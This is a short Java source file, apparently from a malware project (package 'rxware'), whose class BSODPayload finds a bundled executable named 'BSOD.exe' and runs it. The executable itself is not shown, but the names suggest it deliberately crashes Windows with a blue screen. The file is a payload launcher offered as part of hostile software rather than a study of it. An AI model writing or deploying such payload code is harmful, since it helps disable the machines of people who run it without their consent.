package rxware;

import java.io.IOException;
import java.net.URISyntaxException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

public class BSODPayload {
    public static void main() {
        try {
            String exePath = BSODPayload.class.getResource("BSOD.exe").toURI().getPath();

            try {
                Process mainProgram = new ProcessBuilder(exePath).start();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } catch (URISyntaxException e) {
            throw new RuntimeException(e);
        }
    }
}
